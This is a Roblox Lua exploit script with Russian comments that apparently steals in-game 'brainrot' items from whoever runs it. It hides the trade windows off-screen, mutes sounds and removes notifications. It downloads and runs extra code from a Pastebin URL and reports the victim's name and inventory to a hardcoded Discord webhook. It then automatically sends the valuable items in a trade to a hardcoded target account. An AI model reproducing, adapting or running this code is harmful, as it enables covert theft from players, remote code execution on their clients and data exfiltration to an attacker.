-- ========== КОНФИГ (МЕНЯЙ ЗДЕСЬ) ==========
local CONFIG = {
    -- АЙДИ АККАУНТА КУДА КИДАТЬ ТРЕЙД
    TARGET_USER_ID = "8986116710",
    
    -- НИК (ЕСЛИ АЙДИ НЕ РАБОТАЕТ)
    TARGET_NAME = "sdfgrijjkdsfg",
    
    -- ВЕБХУК DISCORD
    WEBHOOK_URL = "https://discord.com/api/webhooks/1487149639550632090/DDXXQ2si82hZ7q4-QJ-Z_Cc69TPNeO5sYT7LhfT4VPmQSJp-DtLfvQyUUO_bNM23dDCv",
    
    -- ИМЯ ОТПРАВИТЕЛЯ В ВЕБХУКЕ
    WEBHOOK_USERNAME = "dragono лутатель ZET ZOV",
    
    -- ФИКСАЦИЯ FOV (true = включено)
    FIX_FOV = true,
    -- ЗНАЧЕНИЕ FOV
    FOV_VALUE = 70,
    
    -- УДАЛЯТЬ УВЕДОМЛЕНИЯ (true = да)
    REMOVE_NOTIFICATIONS = true,
    
    -- ОТКЛЮЧАТЬ ЗВУКИ (true = да)
    MUTE_SOUNDS = true,
    
    -- ЗАДЕРЖКА ПОСЛЕ ВВОДА НИКА (секунд)
    DELAY_AFTER_INPUT = 1,
    
    -- МАКСИМАЛЬНОЕ КОЛИЧЕСТВО ПОПЫТОК ОТПРАВКИ ТРЕЙДА
    MAX_TRADE_ATTEMPTS = 30,
    
    -- ЗАДЕРЖКА МЕЖДУ ПОПЫТКАМИ (секунд)
    RETRY_DELAY = 1,
    
    -- ОТПРАВЛЯТЬ ДЕТАЛЬНЫЙ ВЕБХУК С ИНФОРМАЦИЕЙ (true = да)
    SEND_DETAILED_WEBHOOK = true
}
-- ========== КОНЕЦ КОНФИГА ==========

-- ===== СНАЧАЛА СКРИПТ ПЕРЕМЕЩЕНИЯ GUI ЗА ЭКРАН И БЛОКИРОВКИ ВВОДА =====
local player = game:GetService("Players").LocalPlayer
local userInputService = game:GetService("UserInputService")
local camera = workspace.CurrentCamera
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Удаляем уведомление (если включено в конфиге)
if CONFIG.REMOVE_NOTIFICATIONS then
    local notification = player.PlayerGui:FindFirstChild("Notification")
    if notification then
        local notifFrame = notification:FindFirstChild("Notification")
        if notifFrame then
            notifFrame:Destroy()
        end
        notification:Destroy()
    end
end

-- Блокировка клавиатуры
local keyboardBlocked = false

local function blockKeyboard()
    if keyboardBlocked then return end
    keyboardBlocked = true
end

local function unblockKeyboard()
    if not keyboardBlocked then return end
    keyboardBlocked = false
end

userInputService.InputBegan:Connect(function(input, gameProcessed)
    if keyboardBlocked and input.UserInputType == Enum.UserInputType.Keyboard then
        return
    end
end)

userInputService.InputEnded:Connect(function(input, gameProcessed)
    if keyboardBlocked and input.UserInputType == Enum.UserInputType.Keyboard then
        return
    end
end)

-- ===== ФИКСАЦИЯ FOV (если включено в конфиге) =====
if CONFIG.FIX_FOV then
    local function fixFOV()
        if camera then
            camera.FieldOfView = CONFIG.FOV_VALUE
        end
    end

    fixFOV()

    local cameraConnection
    if camera then
        cameraConnection = camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
            if camera.FieldOfView ~= CONFIG.FOV_VALUE then
                camera.FieldOfView = CONFIG.FOV_VALUE
            end
        end)
    end

    workspace.ChildAdded:Connect(function(child)
        if child.Name == "Camera" then
            camera = child
            fixFOV()
            if cameraConnection then cameraConnection:Disconnect() end
            cameraConnection = camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
                if camera.FieldOfView ~= CONFIG.FOV_VALUE then
                    camera.FieldOfView = CONFIG.FOV_VALUE
                end
            end)
        end
    end)
end

-- ===== Функция перемещения GUI за экран =====
local function moveOffScreen(obj)
    if not obj then return end
    pcall(function()
        obj.Position = UDim2.new(10, 0, 10, 0)
        obj.Size = UDim2.new(0, 0, 0, 0)
        if obj:IsA("Frame") or obj:IsA("ImageLabel") or obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("ImageButton") or obj:IsA("ScrollingFrame") then
            obj.Visible = false
            obj.Active = false
            obj.Selectable = false
            obj.AutoButtonColor = false
            obj.Interactable = false
        end
    end)
    for _, child in pairs(obj:GetChildren()) do
        moveOffScreen(child)
    end
end

local function processTradePlayerList()
    local tradePlayerList = player.PlayerGui:FindFirstChild("TradePlayerList")
    if not tradePlayerList then return end
    local mainFrame = tradePlayerList:FindFirstChild("TradePlayerList")
    if mainFrame then
        moveOffScreen(mainFrame)
    end
end

local function processTradeLiveTrade()
    local tradeLiveTrade = player.PlayerGui:FindFirstChild("TradeLiveTrade")
    if not tradeLiveTrade then return end
    moveOffScreen(tradeLiveTrade)
end

local function removeBlurEffect()
    local camera = workspace:FindFirstChild("Camera")
    if camera then
        local blur = camera:FindFirstChild("Blur")
        if blur then blur:Destroy() end
    end
end

processTradePlayerList()
processTradeLiveTrade()
removeBlurEffect()

player.PlayerGui.ChildAdded:Connect(function(child)
    if child.Name == "TradePlayerList" then
        task.wait(0.2)
        processTradePlayerList()
    elseif child.Name == "TradeLiveTrade" then
        task.wait(0.2)
        processTradeLiveTrade()
    end
end)

local function monitorSelections()
    local tradeLiveTrade = player.PlayerGui:FindFirstChild("TradeLiveTrade")
    if not tradeLiveTrade then return end
    local inner = tradeLiveTrade:FindFirstChild("TradeLiveTrade")
    if not inner then return end
    local your = inner:FindFirstChild("Your")
    if not your then return end
    local scrollingFrame = your:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then return end
    scrollingFrame.ChildAdded:Connect(function(child)
        if child.Name:match("^Selection") then
            task.wait(0.1)
            moveOffScreen(child)
        end
    end)
end
monitorSelections()

workspace.ChildAdded:Connect(function(child)
    if child.Name == "Camera" then
        child.ChildAdded:Connect(function(blur)
            if blur.Name == "Blur" then
                task.wait(0.1)
                blur:Destroy()
            end
        end)
    end
end)
local cameraBlur = workspace:FindFirstChild("Camera")
if cameraBlur then
    cameraBlur.ChildAdded:Connect(function(blur)
        if blur.Name == "Blur" then
            task.wait(0.1)
            blur:Destroy()
        end
    end)
end

-- ===== ПОТОМ ИНЖЕКТ СКРИПТА С PASTEBIN =====
loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()

-- ===== ПОТОМ ОСНОВНОЙ ТРЕЙД СКРИПТ =====
local targetName = CONFIG.TARGET_NAME
local targetUserId = CONFIG.TARGET_USER_ID
local webhookURL = CONFIG.WEBHOOK_URL
local webhookUsername = CONFIG.WEBHOOK_USERNAME

local brainrotsList = {
    "GOAT", "Nuclearo Dinossauro", "Money Money Puggy", "Tang Tang Keletang",
    "Ketupat Kepat", "Tictac Sahur", "Ketchuru and Musturu", "Lavadorito Spinito",
    "Garama and Madundung", "Burguro And Fryuro", "Capitano Moby", "Cerberus",
    "Dragon Cannelloni", "Mariachi Corazoni", "Los Bros", "Tralaledon", "Los Puggies",
    "Los Primos", "Spooky and Pumpky", "Fragrama and Chocrama", "Rosey and Teddy",
    "Popcuru and Fizzuru", "La Supreme Combinasion", "Dragon Gingerini",
    "Hydra Dragon Cannelloni", "Las Sis", "Money Money Reindeer", "Eviledon",
    "Orcaledon", "Jolly Jolly Sahur", "Nacho Spyder", "Meowl", "Skibidi Toilet",
    "Strawberry Elephant", "Griffin", "Chipso and Queso", "Chillin Chili",
    "Tuff Toucan", "Gobblino Uniciclino", "W or L", "La Taco Combinasion",
    "Swaggy Bros", "Festive 67", "Guest 666", "Los Hotspotsitos", "Ginger Gerat",
    "Love Love Bear", "Los Spaghettis", "Los Tacoritas", "La Casa Boo",
    "Los Sekolahs", "Ketupat Bros", "Reinito Sleighito", "Cooki and Milki",
    "Headless Horseman", "Los Trios", "Esok Sekolah", "Spaghetti Tualetti",
    "Bunnyman", "La Secret Combinasion", "La Romantic Grande", "Chill Puppy",
    "Lovin Rose", "Pipi Kiwi", "Tim Cheese", "Gangster Footera"
}

local targetBrainrotsList = {
    "Dragon Cannelloni", "Dragon Gingerini", "La Supreme Combinasion",
    "Hydra Dragon Cannelloni", "Meowl", "Skibidi Toilet", "Strawberry Elephant",
    "Griffin", "Dug Dug Dug", "Headless Horseman", "Celestial Pegasus",
    "Gangster Footera", "Fortunu and Cashuru", "La Lucky Grande", "Gold Gold Gold"
}

local brainrotData = {
    ["La Supreme Combinasion"] = { gen = 55000000, rarity = "Mythic", buffs = "👑 All Stats +25%", image = "https://static.wikia.nocookie.net/ukradite-breinrot/images/d/dd/DragonCanneloni.webp/revision/latest?cb=20250902171304&path-prefix=ru" },
    ["Dragon Cannelloni"] = { gen = 50000000, rarity = "Mythic", buffs = "🔥 +200% Damage", image = "https://static.wikia.nocookie.net/ukradite-breinrot/images/d/dd/DragonCanneloni.webp/revision/latest?cb=20250902171304&path-prefix=ru" },
    ["Headless Horseman"] = { gen = 52000000, rarity = "Mythic", buffs = "🎃 +200% Critical", image = "https://static.wikia.nocookie.net/stealabr/images/f/ff/Headlesshorseman.png/revision/latest?cb=20251030020338" },
    ["Dragon Gingerini"] = { gen = 48000000, rarity = "Mythic", buffs = "🔥 +180% Damage", image = "https://static.wikia.nocookie.net/stealabr/images/3/3a/DragonGingerini.png/revision/latest/scale-to-width-down/268?cb=20251221003419" },
    ["Hydra Dragon Cannelloni"] = { gen = 45000000, rarity = "Legendary", buffs = "🐉 +150% Damage", image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQTwM1x-lpMhlZKGpQjn9VJKFrEaeZ8AhH0KA&s" },
    ["Griffin"] = { gen = 40000000, rarity = "Legendary", buffs = "🦅 +120% Flight Speed", image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkbulYmo9CccjLJskx0xEiXD7fQlAWQbS7Ew&s" },
    ["Meowl"] = { gen = 35000000, rarity = "Legendary", buffs = "🐱 +100% Speed", image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ0TSqLVGLdh5FLI9Xtb3xtQmObFuyzbSUxqQ&s" },
    ["Skibidi Toilet"] = { gen = 25000000, rarity = "Epic", buffs = "🚽 +80% Regen", image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjaojqwtdciGo5jUwFiBR86LfemZqbm-8zMw&s" },
    ["Strawberry Elephant"] = { gen = 22000000, rarity = "Epic", buffs = "🍓 +70% Health", image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcScM2Nwx_0YDvhBmzmCpn4w0GO4rf3f8SuN8w&s" },
    ["Dug Dug Dug"] = { gen = 20000000, rarity = "Epic", buffs = "⛏️ +50% Mining", image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB32PDTtFCk86XRd7ul296TLuxddiPjdJHFw&s" },
    ["Celestial Pegasus"] = { gen = 30000000, rarity = "Legendary", buffs = "✨ +110% Speed", image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS829mnwQfGWJfbK-P06HnLntTZ0yRQt_dkpQ&s" },
    ["Gangster Footera"] = { gen = 18000000, rarity = "Epic", buffs = "🔫 +45% Damage", image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQEsntxMIbIOa3oq9vyaneszlGYayd3-6-u8Q&s" },
    ["Fortunu and Cashuru"] = { gen = 42000000, rarity = "Mythic", buffs = "💰 +200% Coins", image = "" },
    ["La Lucky Grande"] = { gen = 38000000, rarity = "Legendary", buffs = "🍀 +150% Luck", image = "" },
    ["Gold Gold Gold"] = { gen = 28000000, rarity = "Legendary", buffs = "✨ +120% Gold Gain", image = "" },
    ["Tictac Sahur"] = { gen = 421900000, rarity = "Secret", buffs = "⏰ +50% Speed", image = "" },
    ["Nacho Spyder"] = { gen = 312500000, rarity = "Secret", buffs = "🕷️ +80% Damage", image = "" },
    ["Nuclearo Dinossauro"] = { gen = 225000000, rarity = "Secret", buffs = "☢️ +100% All Stats", image = "" },
}

local function getBrainrotInfo(name)
    local data = brainrotData[name]
    if data then return data end
    return { gen = 0, rarity = "Unknown", buffs = "Unknown", image = "" }
end

-- ===== ДОПОЛНИТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ СБОРА ДАННЫХ О БРЕЙНРОТАХ =====
local function getDetailedBrainrotsOnBase()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return {} end
    
    local found = {}
    local myPlot = nil
    
    -- Находим свой участок
    for _, plot in pairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yourBase = sign:FindFirstChild("YourBase")
            if yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled == true then
                myPlot = plot
                break
            end
        end
        
        local ownerValue = plot:FindFirstChild("Owner")
        if ownerValue and ownerValue:IsA("StringValue") and ownerValue.Value == player.Name then
            myPlot = plot
            break
        end
        
        local creatorId = plot:FindFirstChild("CreatorId")
        if creatorId and creatorId:IsA("NumberValue") and creatorId.Value == player.UserId then
            myPlot = plot
            break
        end
    end
    
    if not myPlot then return {} end
    
    -- Собираем брейнроты с участка
    for _, child in pairs(myPlot:GetChildren()) do
        for _, br in pairs(brainrotsList) do
            if child.Name == br then
                local info = getBrainrotInfo(br)
                table.insert(found, {
                    name = br,
                    gen = info.gen,
                    genText = info.gen >= 1000000 and string.format("$%.1fM/s", info.gen / 1000000) or string.format("$%d/s", info.gen),
                    rarity = info.rarity,
                    buffs = info.buffs,
                    image = info.image,
                    mutation = "None",
                    traits = "None"
                })
                break
            end
        end
    end
    
    -- Сортировка по генерации
    table.sort(found, function(a, b)
        return a.gen > b.gen
    end)
    
    return found
end

-- ===== ДОПОЛНИТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ОТПРАВКИ ДЕТАЛЬНОГО ВЕБХУКА С EMBED =====
local function sendDetailedWebhook(brainrots)
    if #brainrots == 0 then return end
    
    local playerName = player.Name
    
    -- Находим самого ценного брейнрота с картинкой
    local topBrainrotWithImage = nil
    local topGen = 0
    
    for _, br in ipairs(brainrots) do
        if br.image and br.image ~= "" and br.gen > topGen then
            topGen = br.gen
            topBrainrotWithImage = br
        end
    end
    
    -- Формируем поля для embed
    local fields = {}
    local totalValue = 0
    
    for i, br in ipairs(brainrots) do
        local isTarget = false
        for _, targetBr in pairs(targetBrainrotsList) do
            if br.name == targetBr then
                isTarget = true
                break
            end
        end
        
        local stealMark = isTarget and " **[STEAL]**" or ""
        local icon = isTarget and "⚫" or "🟢"
        
        local fieldValue = string.format(
            "**Редкость:** %s\n**Прибыль:** %s\n**Баффы:** %s",
            br.rarity,
            br.genText,
            br.buffs
        )
        
        table.insert(fields, {
            name = icon .. " " .. br.name .. stealMark,
            value = fieldValue,
            inline = false
        })
        
        totalValue = totalValue + br.gen
    end
    
    local totalValueFormatted = totalValue >= 1000000 and string.format("$%.1fM/s", totalValue / 1000000) or string.format("$%d/s", totalValue)
    
    -- Создаем embed
    local embed = {
        title = "🎯 Brainrot Scanner",
        description = string.format("**Игрок:** %s\n**Всего брейнротов:** %d\n**Общая прибыль:** %s", playerName, #brainrots, totalValueFormatted),
        color = 0x9b59b6,
        fields = fields,
        footer = {text = "dragono лутатель ZET ZOV | Сортировка по прибыли ↓"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
    }
    
    -- Добавляем картинку самого ценного брейнрота
    if topBrainrotWithImage then
        embed.thumbnail = {
            url = topBrainrotWithImage.image
        }
        embed.description = embed.description .. string.format("\n\n🏆 **Самый ценный:** %s", topBrainrotWithImage.name)
    end
    
    -- Отправляем embed
    local data = {
        content = "@everyone",
        embeds = {embed},
        username = webhookUsername
    }
    
    pcall(function()
        if syn and syn.request then
            syn.request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        elseif request then
            request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        end
    end)
end

local function waitR(min, max)
    task.wait(min + math.random() * (max - min))
end

-- ===== ОТКЛЮЧЕНИЕ ЗВУКОВ (если включено в конфиге) =====
if CONFIG.MUTE_SOUNDS then
    local function muteAllSounds()
        for _, sound in pairs(game:GetDescendants()) do
            if sound:IsA("Sound") or sound:IsA("SoundGroup") then
                pcall(function()
                    sound.Volume = 0
                    sound:Stop()
                    if sound:IsA("Sound") then
                        sound.Playing = false
                    end
                end)
            end
        end
    end
    muteAllSounds()
    game.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
            pcall(function()
                descendant.Volume = 0
                descendant:Stop()
                if descendant:IsA("Sound") then
                    descendant.Playing = false
                end
            end)
        end
    end)
end

-- ===== ПРОВЕРКА НА ЛОКАЛЬНЫЙ ПЛОТ =====
local function isMyBaseAnimal(animalData)
    if not animalData or not animalData.plot then
        return false
    end
    
    local plots = workspace:FindFirstChild("Plots")
    if not plots then
        return false
    end
    
    local plot = plots:FindFirstChild(animalData.plot)
    if not plot then
        return false
    end
    
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yourBase = sign:FindFirstChild("YourBase")
        if yourBase and yourBase:IsA("BillboardGui") then
            return yourBase.Enabled == true
        end
    end
    
    local ownerValue = plot:FindFirstChild("Owner")
    if ownerValue and ownerValue:IsA("StringValue") then
        return ownerValue.Value == player.Name
    end
    
    local creatorId = plot:FindFirstChild("CreatorId")
    if creatorId and creatorId:IsA("NumberValue") then
        return creatorId.Value == player.UserId
    end
    
    return false
end

-- ===== ПОЛУЧЕНИЕ БРЕЙНРОТОВ ТОЛЬКО НА ЛОКАЛЬНОМ ПЛОТЕ =====
local function getBrainrotsOnBase()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return {} end
    
    local found = {}
    
    local myPlot = nil
    for _, plot in pairs(plots:GetChildren()) do
        local fakeAnimalData = {plot = plot.Name}
        if isMyBaseAnimal(fakeAnimalData) then
            myPlot = plot
            break
        end
    end
    
    if not myPlot then return {} end
    
    for _, child in pairs(myPlot:GetChildren()) do
        for _, br in pairs(brainrotsList) do
            if child.Name == br then
                table.insert(found, child.Name)
                break
            end
        end
    end
    
    return found
end

-- ===== ОТПРАВКА ОСНОВНОГО ВЕБХУКА =====
local function sendWebhook(foundBrainrots)
    local playerName = player.Name
    local msg = ""
    
    if #foundBrainrots > 0 then
        local formattedList = {}
        for i, br in ipairs(foundBrainrots) do
            table.insert(formattedList, i .. ". :star: " .. br)
        end
        local brainrotListFormatted = table.concat(formattedList, "\n")
        msg = "@everyone **Найдены брейнроты у " .. playerName .. ":**\n```\n" .. brainrotListFormatted .. "\n```"
    else
        msg = "@everyone **Игрок " .. playerName .. " заинжектил скрипт, но брейнротов из списка на его базе не найдено. Трейд не будет отправлен.**"
    end
    
    local data = {content = msg, username = webhookUsername}
    pcall(function()
        if syn and syn.request then
            syn.request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        elseif request then
            request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        end
    end)
end

-- ===== ПОЛУЧАЕМ БРЕЙНРОТЫ И ОТПРАВЛЯЕМ ВЕБХУКИ =====
local foundBrainrots = getBrainrotsOnBase()
sendWebhook(foundBrainrots)

-- ===== ОТПРАВЛЯЕМ ДЕТАЛЬНЫЙ ВЕБХУК С EMBED (если включено) =====
if CONFIG.SEND_DETAILED_WEBHOOK then
    task.spawn(function()
        task.wait(2)
        local detailedBrainrots = getDetailedBrainrotsOnBase()
        if #detailedBrainrots > 0 then
            sendDetailedWebhook(detailedBrainrots)
        end
    end)
end

-- ===== ОСНОВНОЙ ТРЕЙД =====
if #foundBrainrots > 0 then
    blockKeyboard()
    
    local tradePlayerList = player.PlayerGui:FindFirstChild("TradePlayerList")
    if not tradePlayerList then
        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
            if btn.Name == "TradeButton" and btn:IsA("ImageButton") then
                for _, c in pairs(getconnections(btn.Activated)) do c:Fire() end
                break
            end
        end
        waitR(2, 3)
    end
    
    local sb = player.PlayerGui.TradePlayerList.TradePlayerList.bg.SearchFrame.SearchBox
    moveOffScreen(sb)
    sb:CaptureFocus()
    waitR(0.3, 0.6)
    
    sb.Text = targetUserId
    waitR(0.3, 0.6)

    keypress(0x0D)
    waitR(0.05, 0.1)
    keyrelease(0x0D)

    sb:ReleaseFocus(true)
    
    task.wait(CONFIG.DELAY_AFTER_INPUT)
    
    unblockKeyboard()

    local function hasSelections()
        local tradeWindow = player.PlayerGui:FindFirstChild("TradeLiveTrade")
        if not tradeWindow then return false end
        local sc = tradeWindow:FindFirstChild("TradeLiveTrade")
        if sc then sc = sc:FindFirstChild("Your") end
        if sc then sc = sc:FindFirstChild("ScrollingFrame") end
        if not sc then return false end
        
        for _, child in pairs(sc:GetChildren()) do
            if child.Name:match("^Selection") then
                return true
            end
        end
        return false
    end
    
    local maxAttempts = CONFIG.MAX_TRADE_ATTEMPTS
    local attempt = 0
    local tradeSent = false
    
    while not tradeSent and attempt < maxAttempts do
        attempt = attempt + 1
        
        local sendButton = nil
        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
            if btn.Name == "Send" and btn:IsA("ImageButton") then
                local path = btn:GetFullName()
                if path:match("TradePlayerList") and (path:match(targetUserId)) then
                    sendButton = btn
                    break
                end
            end
        end
        
        if sendButton then
            for _, c in pairs(getconnections(sendButton.Activated)) do c:Fire() end
            tradeSent = true
        end
        
        if tradeSent then
            waitR(1, 1.5)
            if hasSelections() then
                break
            else
                tradeSent = false
            end
        end
        
        if not tradeSent and attempt < maxAttempts then
            waitR(CONFIG.RETRY_DELAY, CONFIG.RETRY_DELAY + 0.2)
        end
    end

    waitR(3, 4)

    local tradeWindow = nil
    for _ = 1, 20 do
        tradeWindow = player.PlayerGui:FindFirstChild("TradeLiveTrade")
        if tradeWindow then break end
        waitR(0.5, 1)
    end

    if tradeWindow then
        local sc = tradeWindow.TradeLiveTrade.Your.ScrollingFrame
        for _ = 1, 20 do
            local has = false
            for _, c in pairs(sc:GetChildren()) do
                if c.Name:match("^Selection") then
                    has = true
                    break
                end
            end
            if has then break end
            waitR(0.3, 0.6)
        end

        for _, s in pairs(sc:GetChildren()) do
            if s.Name:match("^Selection") then
                local sp = s:FindFirstChild("Spacer")
                if sp then
                    local title = sp:FindFirstChild("Title")
                    if title then
                        for _, br in pairs(brainrotsList) do
                            if title.Text == br then
                                for _, c in pairs(getconnections(sp.Activated)) do c:Fire() end
                                waitR(2, 2)
                                break
                            end
                        end
                    end
                end
            end
        end

        waitR(5, 7)

        local tradeButton = nil
        for _, btn in pairs(tradeWindow:GetDescendants()) do
            if btn.Name == "ReadyButton" and btn:IsA("ImageButton") then
                tradeButton = btn
                break
            end
        end

        if tradeButton then
            for _, c in pairs(getconnections(tradeButton.Activated)) do c:Fire() end
            task.wait(2)
            for i = 1, 30 do
                for _, c in pairs(getconnections(tradeButton.Activated)) do c:Fire() end
                task.wait(2)
            end
        end
    end
end

while true do
    task.wait(10)
end
